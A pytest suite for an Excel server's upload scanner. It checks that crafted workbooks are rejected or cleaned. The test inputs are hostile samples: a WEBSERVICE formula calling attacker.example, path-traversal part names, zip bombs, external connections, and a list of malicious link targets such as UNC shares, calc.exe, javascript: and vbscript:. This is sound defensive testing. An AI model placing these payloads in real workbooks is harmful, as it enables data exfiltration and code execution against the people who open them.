import base64
import io
import sys
import tracemalloc
import warnings
import zipfile
from pathlib import Path
from xml.sax.saxutils import escape

import pytest
from openpyxl import Workbook, load_workbook

from excel_mcp import upload_links
from excel_mcp.config import Limits
from excel_mcp.errors import ExcelMCPError
from excel_mcp.operations.files import decode_workbook
from excel_mcp.upload_scan import scan_package
from tests.conftest import ToolCall

MAIN = 'xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
ATTACK = 'WEBSERVICE("https://attacker.example")'
pytestmark = pytest.mark.anyio
LIMITS = Limits()


def _base() -> dict[str, bytes]:
    buffer = io.BytesIO()
    Workbook().save(buffer)
    with zipfile.ZipFile(buffer) as archive:
        return {name: archive.read(name) for name in archive.namelist()}


def _package(
    extra: list[tuple[str, bytes]] | None = None, replace: dict[str, bytes] | None = None
) -> bytes:
    parts = {**_base(), **(replace or {})}
    buffer = io.BytesIO()
    with (
        zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive,
        warnings.catch_warnings(),
    ):
        warnings.simplefilter("ignore")  # duplicate names are the point of some tests
        for name, content in [*parts.items(), *(extra or [])]:
            archive.writestr(name, content)
    return buffer.getvalue()


def _decode(content: bytes, limits: Limits = LIMITS) -> bytes:
    return decode_workbook(base64.b64encode(content).decode(), limits).content


def _rejected(content: bytes, limits: Limits = LIMITS) -> str:
    with pytest.raises(ExcelMCPError) as caught:
        _decode(content, limits)
    return str(caught.value)


def test_a_plain_workbook_is_accepted() -> None:
    _decode(_package())


@pytest.mark.parametrize(
    "name",
    ["customXml/item1.dat", "docProps/notes.TXT", "xl/media/pic.png", "other.xmL", "Sheet"],
)
def test_formulas_are_found_in_xml_parts_whatever_they_are_called(name: str) -> None:
    sheet = (
        f"<worksheet {MAIN}><sheetData><row><c><f>{ATTACK}</f></c></row></sheetData></worksheet>"
    )
    assert "not allowed" in _rejected(_package([(name, sheet.encode())]))


def test_formulas_are_found_in_utf16_xml_parts() -> None:
    sheet = f"<worksheet {MAIN}><f>{ATTACK}</f></worksheet>".encode("utf-16")
    assert "not allowed" in _rejected(_package([("misc/data.bin", sheet)]))


@pytest.mark.parametrize("name", ["../evil.xml", "/abs.xml", "C:/x.xml", "a/../../b.xml"])
def test_unsafe_part_names_are_rejected(name: str) -> None:
    assert "unsafe name" in _rejected(_package([(name, b"<a/>")]))


@pytest.mark.skipif(sys.platform == "win32", reason="zipfile turns backslashes into slashes")
def test_backslashes_in_part_names_are_rejected() -> None:
    content = _package([("xl_x.xml", b"<a/>")]).replace(b"xl_x.xml", b"xl\\x.xml")
    assert "unsafe name" in _rejected(content)


def test_duplicate_parts_are_rejected() -> None:
    assert "more than one part" in _rejected(_package([("xl/workbook.xml", b"<a/>")]))
    assert "more than one part" in _rejected(_package([("XL/Workbook.xml", b"<a/>")]))


@pytest.mark.parametrize(
    ("name", "content"),
    [
        ("xl/connections.xml", b'<connections xmlns="urn:x"/>'),
        ("elsewhere/c.bin", b"<connections/>"),
        ("xl/queryTables/queryTable1.xml", b"<queryTable/>"),
        ("xl/externalLinks/l.xml", b"<externalLink/>"),
    ],
)
def test_remote_data_parts_are_rejected(name: str, content: bytes) -> None:
    assert "reach outside the file" in _rejected(_package([(name, content)]))


def test_remote_data_content_types_and_relationships_are_rejected() -> None:
    types = _base()["[Content_Types].xml"].replace(
        b"</Types>",
        b'<Override PartName="/x/y.bin" ContentType="application/vnd.openxmlformats-'
        b'officedocument.spreadsheetml.connections+xml"/></Types>',
    )
    assert "reach outside the file" in _rejected(_package(replace={"[Content_Types].xml": types}))
    relationship = (
        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        b'<Relationship Id="r1" Type="http://x/relationships/queryTable" Target="q.xml"/>'
        b"</Relationships>"
    )
    assert "reach outside the file" in _rejected(_package([("xl/_rels/other.rels", relationship)]))


def test_total_expansion_is_limited() -> None:
    limits = Limits(max_file_bytes=10_000, max_unpack_factor=2)
    content = _package([("docs/big.dat", b"1234567890" * 3000)])
    assert "expands to more than" in _rejected(content, limits)


def test_dense_compression_is_rejected() -> None:
    zeros = bytes(8 * 1024 * 1024)
    assert "compressed too densely" in _rejected(_package([("docs/zeros.dat", zeros)]))


class _Endless:
    def read(self, size: int) -> bytes:
        return b"<a>" * (size // 3)


def test_limits_are_enforced_while_reading_whatever_the_header_says() -> None:
    from excel_mcp.upload_scan import _Entry  # pyright: ignore[reportPrivateUsage]

    info = zipfile.ZipInfo("x.xml")
    info.compress_size = 10**9  # a header that hides the real size
    limits = Limits(max_file_bytes=1000, max_unpack_factor=1)
    entry = _Entry(_Endless(), info, limits, limits.max_unpacked_bytes)  # type: ignore[arg-type]
    with pytest.raises(ExcelMCPError, match="expands to more than"):
        entry.drain()


def test_deeply_nested_xml_is_rejected() -> None:
    deep = b"<a>" * 150 + b"</a>" * 150
    assert "nested too deeply" in _rejected(_package([("docs/deep.xml", deep)]))


def test_scanning_uses_constant_memory() -> None:
    rows = b"".join(b"<row><c><v>%d</v></c></row>" % number for number in range(300_000))
    sheet = b"<worksheet><sheetData>" + rows + b"</sheetData></worksheet>"
    content = _package([("docs/rows.xml", sheet)])
    tracemalloc.start()
    try:
        assert list(scan_package(content, LIMITS)) == []
        peak = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    assert peak < 20 * 1024 * 1024


async def test_import_reports_unsafe_packages(call_error: ToolCall, files: Path) -> None:
    content = base64.b64encode(_package([("docs/c.bin", b"<connections/>")])).decode()
    message = await call_error("import_workbook", path="up.xlsx", content_base64=content)
    assert "reach outside the file" in message
    assert not (files / "up.xlsx").exists()


def test_lenient_legacy_drawings_are_accepted_but_broken_xml_parts_are_not() -> None:
    vml = b"<xml><v:textbox><div>line<br>next</div></v:textbox></xml>"
    _decode(_package([("xl/drawings/vmlDrawing1.vml", vml)]))
    assert "not valid XML" in _rejected(_package([("xl/extra.xml", vml)]))


PRESERVED_PARTS = [
    "xl/charts/chartEx1.xml",
    "xl/slicers/slicer1.xml",
    "xl/slicerCaches/slicerCache1.xml",
    "xl/timelines/timeline1.xml",
    "xl/threadedComments/threadedComment1.xml",
    "xl/metadata.xml",
    "customXml/item1.xml",
    "xl/pivotCache/pivotCacheDefinition1.xml",
]


_NAMESPACES = (
    'xmlns:cx="http://schemas.microsoft.com/office/drawing/2014/chartex" '
    'xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" '
    'xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"'
)
_QUOTED = ATTACK.replace('"', "&quot;")


@pytest.mark.parametrize("name", PRESERVED_PARTS)
@pytest.mark.parametrize(
    "body",
    [
        f"<cx:chartSpace {_NAMESPACES}><cx:f>{ATTACK}</cx:f></cx:chartSpace>",
        f"<root {_NAMESPACES}><x14:sparkline><xm:f>{ATTACK}</xm:f></x14:sparkline></root>",
        f'<root {MAIN}><cacheField name="x" formula="{_QUOTED}"/></root>',
        f'<root {MAIN}><calculatedItem formula="{_QUOTED}"/></root>',
        f"<root {MAIN}><formula1>{ATTACK}</formula1></root>",
    ],
)
def test_hostile_formulas_in_preserved_parts_are_found(name: str, body: str) -> None:
    assert "not allowed" in _rejected(_package([(name, body.encode())]))


def test_pivot_formulas_are_checked_for_safety_but_not_for_syntax() -> None:
    cache = (
        f"<root {MAIN}>".encode()
        + b'<cacheField name="x" formula="&apos;Total Sales&apos;*2+Region[North]"/></root>'
    )
    _decode(_package([("xl/pivotCache/pivotCacheDefinition1.xml", cache)]))


async def test_a_workbook_with_everything_the_server_can_add_is_accepted(
    call: ToolCall, sample: Path
) -> None:
    book = {"path": "sales.xlsx"}
    await call("set_table", **book, sheet="Data", range="A1:D5", name="Sales")
    await call("add_sparklines", **book, sheet="Data", range="F2:F5", source="C2:D5")
    await call(
        "create_chart",
        **book,
        sheet="Report",
        chart_type="waterfall",
        series=[{"values": "Data!C2:C5", "name": "Data!C1", "categories": "Data!A2:A5"}],
        at="B2",
    )
    await call(
        "create_pivot_table",
        **book,
        source="Data!A1:D5",
        sheet="Report",
        at="L1",
        row_fields=["Region"],
        value_fields=[{"field": "Revenue"}],
        calculated_fields=[{"name": "Revenue", "formula": "=Units*Price"}],
    )
    await call(
        "add_slicer",
        **book,
        sheet="Data",
        target={"sheet": "Data", "name": "Sales"},
        field="Region",
        at="H2",
    )

    _decode(sample.read_bytes())


CUSTOM = (
    b'<item xmlns="urn:company:properties"><f>some text, not a formula</f>'
    b"<formula>1 + (</formula></item>"
)


def test_parts_in_other_namespaces_are_not_read_as_formulas() -> None:
    _decode(_package([("customXml/item1.xml", CUSTOM), ("docs/anything.dat", CUSTOM)]))


def test_a_relocated_sheet_in_the_spreadsheetml_namespace_is_still_checked() -> None:
    sheet = (
        f"<worksheet {MAIN}><sheetData><row><c><f>{ATTACK}</f></c></row></sheetData></worksheet>"
    )
    assert "not allowed" in _rejected(_package([("customXml/hidden.dat", sheet.encode())]))


def test_parts_that_claim_an_excel_content_type_are_checked_in_any_namespace() -> None:
    types = _base()["[Content_Types].xml"].replace(
        b"</Types>",
        b'<Override PartName="/customXml/item1.xml" ContentType="application/vnd.openxmlformats-'
        b'officedocument.spreadsheetml.sheet.main+xml"/></Types>',
    )
    body = f'<item xmlns="urn:company:properties"><f>{ATTACK}</f></item>'.encode()
    content = _package([("customXml/item1.xml", body)], replace={"[Content_Types].xml": types})
    assert "not allowed" in _rejected(content)


_X14 = 'xmlns="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"'


def test_form_control_links_are_checked() -> None:
    plain = f'<formControlPr {_X14} fmlaLink="$A$1" fmlaRange="Sheet!$B$1:$B$5"/>'
    _decode(_package([("xl/ctrlProps/ctrlProp1.xml", plain.encode())]))
    hostile = f'<formControlPr {_X14} fmlaLink="{_QUOTED}"/>'
    assert "not allowed" in _rejected(_package([("xl/ctrlProps/ctrlProp1.xml", hostile.encode())]))
    elsewhere = f'<formControlPr {_X14} fmlaRange="[1]Sheet1!$B$1:$B$5"/>'
    assert "other workbooks" in _rejected(
        _package([("xl/ctrlProps/ctrlProp2.xml", elsewhere.encode())])
    )


async def test_uploads_are_scanned_before_macros_are_stripped(
    call_error: ToolCall, files: Path
) -> None:
    sheet = (
        f"<worksheet {MAIN}><sheetData><row><c><f>{ATTACK}</f></c></row></sheetData></worksheet>"
    )
    content = _package(
        [
            ("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0 not really a project"),
            ("x/s.dat", sheet.encode()),
        ]
    )
    message = await call_error(
        "import_workbook", path="up.xlsx", content_base64=base64.b64encode(content).decode()
    )
    assert "not allowed" in message
    assert not (files / "up.xlsx").exists()


_RELS = "http://schemas.openxmlformats.org/package/2006/relationships"
_REL_TYPES = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"


def _rels(kind: str, target: str, external: bool = True) -> bytes:
    mode = ' TargetMode="External"' if external else ""
    return (
        f'<Relationships xmlns="{_RELS}">'
        f'<Relationship Id="rId1" Type="{_REL_TYPES}/{kind}" Target="{target}"{mode}/>'
        "</Relationships>"
    ).encode()


@pytest.mark.parametrize(
    ("part", "kind"),
    [
        ("xl/worksheets/_rels/sheet1.xml.rels", "oleObject"),
        ("xl/drawings/_rels/drawing1.xml.rels", "oleObject"),
        ("xl/ctrlProps/_rels/ctrlProp1.xml.rels", "image"),
        ("xl/embeddings/_rels/x.bin.rels", "package"),
        ("xl/worksheets/_rels/sheet1.xml.rels", "image"),
        ("xl/worksheets/_rels/sheet1.xml.rels", "oleLink"),
        ("customXml/_rels/item1.xml.rels", "customXml"),
    ],
)
def test_external_relationships_other_than_hyperlinks_are_rejected(part: str, kind: str) -> None:
    content = _package([(part, _rels(kind, r"file:///C:/secret.xlsx"))])
    assert "reach outside the file" in _rejected(content)


@pytest.mark.parametrize(
    "target", ["https://example.com/a?b=1", "http://example.com", "mailto:me@example.com"]
)
def test_external_hyperlinks_are_accepted(target: str) -> None:
    _decode(_package([("xl/worksheets/_rels/sheet1.xml.rels", _rels("hyperlink", target))]))


def test_internal_relationships_to_embedded_objects_are_accepted() -> None:
    rels = _rels("oleObject", "../embeddings/oleObject1.bin", external=False)
    embedded = b"\xd0\xcf\x11\xe0 embedded object bytes"
    _decode(
        _package(
            [
                ("xl/worksheets/_rels/sheet1.xml.rels", rels),
                ("xl/embeddings/oleObject1.bin", embedded),
            ]
        )
    )


@pytest.mark.parametrize(
    "body",
    [
        f'<oleObjects {MAIN}><oleObject progId="Excel.Sheet.12" link="[1]Sheet1!R1C1" shapeId="1"/>'
        "</oleObjects>",
        f"<root {MAIN}><oleLink/></root>",
    ],
)
def test_linked_ole_objects_are_rejected(body: str) -> None:
    assert "reach outside the file" in _rejected(_package([("xl/worksheets/s.dat", body.encode())]))


def test_embedded_ole_objects_are_accepted() -> None:
    body = f'<oleObjects {MAIN}><oleObject progId="Excel.Sheet.12" shapeId="1"/></oleObjects>'
    _decode(_package([("xl/worksheets/s.dat", body.encode())]))


BAD_LINKS = [
    r"file:///\\host\share\x.xlsx",
    "file:///C:/Windows/System32/calc.exe",
    "file://evilhost/share/x.xlsx",
    r"\\host\share\x.xlsx",
    r"C:\Windows\System32\calc.exe",
    "smb://host/share",
    "ms-excel:ofe|u|file://host/share/x.xlsx",
    "search-ms:query=a&crumb=location:\\\\host\\share",
    "ftp://host/file",
    "javascript:alert(1)",
    "vbscript:msgbox(1)",
    "data:text/html;base64,PHNjcmlwdD4=",
    "file:",
    "http://user:pw@host/",
    "https://user@host/path",
    "https://host\\@evil.example/",
    "http:///nohost",
    "mailto:",
    "",
]


@pytest.mark.parametrize(
    "target", ["https://example.com/a?b=1", "mailto:me@example.com", "#Sheet1!A1"]
)
def test_drawing_and_vml_links_to_web_pages_are_accepted(target: str) -> None:
    drawing_rels = _rels("hyperlink", target)
    vml = f'<xml><v:shape href="{target}"/></xml>'.encode()
    _decode(
        _package(
            [
                ("xl/drawings/_rels/drawing1.xml.rels", drawing_rels),
                ("xl/drawings/vmlDrawing1.vml", vml),
            ]
        )
    )


_R = 'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"'
_A = 'xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"'


def _relationships(*links: tuple[str, str]) -> bytes:
    body = "".join(
        f'<Relationship Id="{rel_id}" Type="{_REL_TYPES}/hyperlink" '
        f'Target="{escape(target, {chr(34): "&quot;"})}" TargetMode="External"/>'
        for rel_id, target in links
    )
    return f'<Relationships xmlns="{_RELS}">{body}</Relationships>'.encode()


def _upload(
    parts: list[tuple[str, bytes]],
) -> tuple[zipfile.ZipFile, list[upload_links.RemovedLink]]:
    result = decode_workbook(base64.b64encode(_package(parts)).decode(), LIMITS)
    return zipfile.ZipFile(io.BytesIO(result.content)), list(result.removed)


@pytest.mark.parametrize("target", BAD_LINKS)
def test_unsafe_cell_hyperlinks_are_removed_and_the_rest_kept(target: str) -> None:
    sheet = (
        f'<worksheet {MAIN} {_R}><sheetData><row r="5"><c r="A5" t="inlineStr"><is><t>doc</t>'
        '</is></c></row></sheetData><hyperlinks><hyperlink ref="A5" r:id="rId1"/>'
        '<hyperlink ref="A6" r:id="rId2"/><hyperlink ref="A7" location="Sheet1!B2"/>'
        "</hyperlinks></worksheet>"
    )
    rels = _relationships(("rId1", target), ("rId2", "https://example.com/"))
    archive, removed = _upload(
        [
            ("xl/worksheets/sheet9.xml", sheet.encode()),
            ("xl/worksheets/_rels/sheet9.xml.rels", rels),
        ]
    )
    assert [link.where for link in removed] == ["A5"]
    assert removed[0].target == target
    text = archive.read("xl/worksheets/sheet9.xml").decode()
    assert 'ref="A5"' not in text.split("<hyperlinks>")[1]
    assert "<t>doc</t>" in text
    assert 'ref="A6"' in text
    assert 'location="Sheet1!B2"' in text
    kept = archive.read("xl/worksheets/_rels/sheet9.xml.rels").decode()
    assert "rId1" not in kept
    assert "https://example.com/" in kept


def test_unsafe_shape_and_picture_links_are_removed_with_their_relationship() -> None:
    drawing = (
        f"<xdr:wsDr {_R} {_A} "
        'xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing">'
        '<xdr:pic><xdr:nvPicPr><xdr:cNvPr id="2" name="Logo">'
        '<a:hlinkClick r:id="rId1"><a:extLst/></a:hlinkClick></xdr:cNvPr></xdr:nvPicPr></xdr:pic>'
        '<xdr:sp><xdr:nvSpPr><xdr:cNvPr id="3" name="Box"><a:hlinkClick r:id="rId2"/>'
        "</xdr:cNvPr></xdr:nvSpPr></xdr:sp></xdr:wsDr>"
    )
    rels = _relationships(("rId1", r"\\host\share\doc.pdf"), ("rId2", "https://example.com/"))
    archive, removed = _upload(
        [
            ("xl/drawings/drawing1.xml", drawing.encode()),
            ("xl/drawings/_rels/drawing1.xml.rels", rels),
        ]
    )
    assert [link.target for link in removed] == [r"\\host\share\doc.pdf"]
    text = archive.read("xl/drawings/drawing1.xml").decode()
    assert 'r:id="rId1"' not in text
    assert 'r:id="rId2"' in text
    assert 'name="Logo"' in text
    assert "rId1" not in archive.read("xl/drawings/_rels/drawing1.xml.rels").decode()


@pytest.mark.parametrize("target", BAD_LINKS[:12])
def test_unsafe_vml_links_are_removed(target: str) -> None:
    quoted = escape(target, {'"': "&quot;"})
    vml = f'<xml><v:shape id="s1" href="{quoted}"/><v:shape id="s2" href="https://example.com/"/></xml>'
    archive, removed = _upload([("xl/drawings/vmlDrawing1.vml", vml.encode())])
    assert [link.target for link in removed] == [target]
    text = archive.read("xl/drawings/vmlDrawing1.vml").decode()
    assert 'id="s1"' in text
    assert "https://example.com/" in text
    assert "href" not in text.replace('href="https://example.com/"', "")


def test_a_link_that_cannot_be_removed_safely_rejects_the_upload() -> None:
    sheet = f'<worksheet {MAIN} {_R}><somethingElse r:id="rId1"/></worksheet>'
    rels = _relationships(("rId1", r"\\host\share\doc.pdf"))
    parts = [
        ("xl/worksheets/sheet9.xml", sheet.encode()),
        ("xl/worksheets/_rels/sheet9.xml.rels", rels),
    ]
    assert "cannot be removed safely" in _rejected(_package(parts))


def test_the_note_names_a_few_links_and_counts_the_rest() -> None:
    removed = [upload_links.RemovedLink(f"A{n}", rf"\\server\share\{n}.pdf") for n in range(1, 6)]
    note = upload_links.describe(removed)
    assert note.startswith("Removed 5 links to files or network locations: A1 (")
    assert r"\\server\share\3.pdf" in note
    assert "A4" not in note
    assert note.endswith("and 2 more.")


async def test_import_reports_the_links_it_removed(call: ToolCall, files: Path) -> None:
    workbook = Workbook()
    sheet = workbook.worksheets[0]
    for row, address in enumerate([r"\\server\share\x.pdf", "https://example.com/"], start=1):
        sheet.cell(row=row, column=1, value="doc").hyperlink = address
    buffer = io.BytesIO()
    workbook.save(buffer)

    result = await call(
        "import_workbook",
        path="up.xlsx",
        content_base64=base64.b64encode(buffer.getvalue()).decode(),
    )

    assert (
        result["note"]
        == r"Removed 1 link to files or network locations: A1 (\\server\share\x.pdf)."
    )
    links = load_workbook(files / "up.xlsx").worksheets[0]
    assert links["A1"].hyperlink is None
    assert links["A1"].value == "doc"
    second = links["A2"].hyperlink
    assert second is not None
    assert second.target == "https://example.com/"


@pytest.mark.parametrize(
    "kind", ["oleObject", "externalLink", "connections", "queryTable", "package", "image"]
)
def test_external_relationships_that_cannot_be_neutralised_are_still_rejected(kind: str) -> None:
    content = _package([("xl/worksheets/_rels/sheet1.xml.rels", _rels(kind, r"\\host\share\x"))])
    assert "reach outside the file" in _rejected(content)
